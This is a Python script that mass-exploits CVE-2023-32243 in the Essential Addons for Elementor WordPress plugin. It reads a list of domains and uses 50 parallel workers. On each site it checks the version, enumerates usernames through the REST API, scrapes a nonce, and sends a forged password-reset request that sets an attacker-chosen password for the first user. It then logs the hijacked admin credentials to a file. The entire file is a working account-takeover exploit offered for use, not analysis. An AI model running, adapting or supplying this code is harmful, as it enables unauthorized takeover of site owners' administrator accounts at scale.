import argparse
import requests
import re
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

session = requests.Session()

# https://github.com/RandomRobbieBF/CVE-2023-32243
# https://github.com/domainhigh/Mass-CVE-2023-32243
# https://www.facebook.com/endang.phtml

def check_version(wordpress_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
    }
    try:
        response = session.get(wordpress_url, headers=headers, verify=False)
        if "/front-end/css/view/general.min.css" in response.text:
            try:
                version_match = re.search(
                    r"front-end/css/view/general\.min\.css\?ver=(\d+\.\d+\.\d+)", response.text)
                if version_match:
                    version = version_match.group(1)
                    if "5.4.0" <= version <= "5.7.1":
                        print("Found Vulnerable Version:", version)
                        return True
                    else:
                        print("Found version: " + version + " sadly not vulnerable.")
                        return False
            except Exception as e:
                print("Error occurred while extracting version:", str(e))
                return False
        else:
            url = f"{wordpress_url}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt"
            response = session.get(url, headers=headers, verify=False)
            if "Essential Addons for Elementor" not in response.text:
                print("Unable to find essential-addons-for-elementor-lite plugin readme.txt.")
                return False
            for line in response.text.splitlines():
                if line.startswith("Stable tag:"):
                    stable_tag = line.split(":")[1].strip()  # Extract the value of the stable tag
                    print(stable_tag)
                    if "5.4.0" <= stable_tag <= "5.7.1":
                        print("Found Vulnerable Version:", stable_tag)
                        return True
                    else:
                        print("Found version: " + stable_tag + " sadly not vulnerable.")
                        return False
        return False
    except requests.exceptions.ConnectionError as ce:
        print("Domain error occurred and move on to the next domain.")
        return False


def extract_usernames(wordpress_url):
    try:
        rest_api_usernames = get_usernames_rest_api(wordpress_url)
        all_usernames = list(set(rest_api_usernames))
        return all_usernames
    except Exception as e:
        print("Error occurred while extracting usernames")


# Method 2: Using WordPress REST API
def get_usernames_rest_api(wordpress_url):
    headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
    api_url = wordpress_url + '/wp-json/wp/v2/users'
    response = session.get(api_url, headers=headers, verify=False)
    if response.status_code == 200:
        users = response.json()
        usernames = [user['slug'] for user in users]
        return usernames
    else:
        print(f"Failed to fetch usernames using REST API")
        return []


def select_username(usernames):
    if not usernames:
        print("Sorry, unable to help. No usernames found.")
        return None

    print("Selecting the first username...")
    return usernames[0]


def extract_nonce(wordpress_url):
    try:
        url = f"{wordpress_url}/"
        headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
        response = session.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "lxml")
        script_tag = soup.find("script", string=lambda t: "var localize" in str(t))
        script_text = script_tag.text.strip() if script_tag else ""
        nonce_start_index = script_text.find('"nonce":"') + 9
        nonce_end_index = script_text.find('"', nonce_start_index)
        return script_text[nonce_start_index:nonce_end_index]
    except Exception as e:
        print("Sorry, not able to help:")
        return None


def send_request(wordpress_url, nonce, user, password):
    url = f"{wordpress_url}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = {
        "action": "login_or_register_user",
        "eael-resetpassword-submit": "true",
        "page_id": "124",
        "widget_id": "224",
        "eael-resetpassword-nonce": nonce,
        "eael-pass1": password,
        "eael-pass2": password,
        "rp_login": user
    }

    response = session.post(url, headers=headers, data=payload, verify=False)

    if 'success":true' in response.text:
        print("All Set! You can now login using the following credentials:")
        print("Username: ", user)
        print("Password: ", password)
        print("Admin Url: " + wordpress_url + "/wp-admin/")
        return True
    else:
        print("Error, see html response below to debug")
        return False


def process_domain(domain, password):
    print(f"\nProcessing domain: {domain}")
    check_version(domain)
    try:
        all_usernames = extract_usernames(domain)
    except Exception as e:
        print(f"Error extracting usernames: {e}")
        return

    selected_username = select_username(all_usernames)
    nonce = extract_nonce(domain)
    if not nonce:
        print("Sorry, not able to extract the nonce")
        return

    print(f"Nonce value: {nonce}")
    print(f"Username value: {selected_username}")

    if send_request(domain, nonce, selected_username, password):
        with open("results.txt", "a") as result_file:
            result_file.write(f"username: {selected_username}\n")
            result_file.write(f"password: {password}\n")
            result_file.write(f"Website: {domain}/wp-admin/\n\n")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--list", required=True, help="Path to the file containing a list of domain names")
    parser.add_argument("-p", "--password", required=True, help="Password to set for the selected username")
    args = parser.parse_args()

    domain_file = args.list
    password = args.password

    if not os.path.isfile(domain_file):
        print(f"File not found: {domain_file}")
        exit()

    with open(domain_file, "r") as file:
        domain_list = file.read().splitlines()

    pool = Pool(50)  # Create a pool of 50 workers

    pool.starmap(process_domain, [(domain, password) for domain in domain_list])

    pool.close()
    pool.join()

    print("\nFinished processing all domains.")
